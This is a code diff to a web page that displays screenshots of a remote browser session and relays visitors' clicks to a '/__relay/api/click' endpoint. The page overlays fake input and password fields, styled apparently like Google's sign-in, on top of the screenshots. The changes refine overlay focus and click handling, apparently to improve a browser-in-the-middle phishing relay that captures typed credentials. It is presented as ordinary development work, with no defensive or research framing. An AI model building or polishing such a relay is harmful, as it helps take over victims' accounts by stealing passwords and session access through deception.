@@ -23,8 +23,9 @@ body{font-family:Arial,sans-serif;background:#f0f4f9;color:#202124;
  color:#202124;outline:none;border:none;background:#fff;z-index:5}
 #ov-in.egpw{-webkit-text-security:disc;letter-spacing:1px}
 #ov-lbl{position:absolute;display:none;font-family:Arial,sans-serif;line-height:normal;
- z-index:7;background:#fff;padding:0 4px;white-space:nowrap;width:auto!important}
-#ov-top{position:absolute;display:none;height:2px;z-index:6}
+ z-index:7;background:#fff;padding:0 4px;white-space:nowrap;width:auto!important;
+ pointer-events:none}
+#ov-top{position:absolute;display:none;height:2px;z-index:6;pointer-events:none}
 #ov-btn{position:absolute;display:none;background:#0b57d0;color:#fff;border:none;font-family:Arial,sans-serif;
  font-weight:500;font-size:14px;cursor:pointer;z-index:5;border-radius:4px}
 #boot{margin:44px auto 12px;width:30px;height:30px;border:3px solid #dadce0;
@@ -86,10 +87,14 @@ shot.addEventListener('click',function(e){
  if(!SID)return;
  var r=shot.getBoundingClientRect();
  var x=100*(e.clientX-r.left)/r.width, y=100*(e.clientY-r.top)/r.height;
+ /* click vào vùng input đang active = focus overlay (không relay đi) */
+ var ib=CUR_BOX;
+ if(ib&&x>=ib.x-1&&x<=ib.x+ib.w+1&&y>=ib.y-1&&y<=ib.y+ib.h+1&&
+    ovIn.style.display==='block'){ovIn.focus();return;}
  fetch('/__relay/api/click',{method:'POST',headers:{'Content-Type':'application/json'},
   body:JSON.stringify({id:SID,x:x,y:y})}).catch(function(){});
 });
-var lastHash='', cardW=0;
+var lastHash='', cardW=0, CUR_BOX=null;
 /* sidecar captures at 2x DPR; card_w tells the true CSS width for 1:1 */
 shot.onload=function(){
  shot.style.width=(cardW||Math.round(shot.naturalWidth/(shot.naturalWidth>1200?2:1)))+'px';
@@ -126,7 +131,7 @@ function render(x){
  }
  var ib=x.input_box, bb=x.button_box, k=x.input_kind, L=x.label;
  if(ib&&k&&x.state!=='done'&&x.state!=='error'){
-  KIND=k;
+  KIND=k;CUR_BOX=ib;
   ovIn.className=k==='password'?'egpw':'';
   if(ovIn.getAttribute('data-k')!==k){ovIn.value='';ovIn.setAttribute('data-k',k);}
   place(ovIn,ib,function(){
